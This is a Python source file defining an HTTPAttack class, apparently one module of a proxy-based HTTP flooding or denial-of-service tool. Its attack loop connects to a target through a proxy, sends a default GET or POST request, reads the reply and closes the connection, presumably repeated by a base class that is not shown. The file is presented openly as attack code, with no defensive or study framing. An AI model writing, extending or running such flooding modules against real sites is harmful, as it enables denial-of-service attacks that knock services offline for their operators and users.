from Proxies.Protocols.HttpProtocol import ExampleHttpHeaders, HttpRequest
from AttackMethod import AttackMethod


class HTTPAttack(AttackMethod):
    """
    The HTTPAttack method attack its target by sending HTTP requests to its target. This attack method
        can work with any proxy.
    """
    def __init__(self, proxy, target_host, method="GET"):
        """
        Constructor

        :param proxy: The proxy that this Attack method will use.
        :param target_host: The target address and port in the form of a Destination object.
        :param method: The request method which the HTTPAttack will use. The method can be POST or GET (GET by default)
        """
        AttackMethod.__init__(self, proxy, target_host)

        if method == "GET" or method == "POST":
            self._http_request = HttpRequest(method, "/", ExampleHttpHeaders['default'])
        else:
            raise ValueError("The method " + method + " is not recognised as a valid option for the HTTPAttack module.")

    def _attack_loop(self):
        """
            The attack_loop of this attack. Connects to the target, sends the HTTP request, waits for reply and closes
            the connection.
        """
        self._proxy.connect(self._attack_target)
        self._proxy.send(self._http_request)
        self._proxy.receive()
        self._proxy.close()
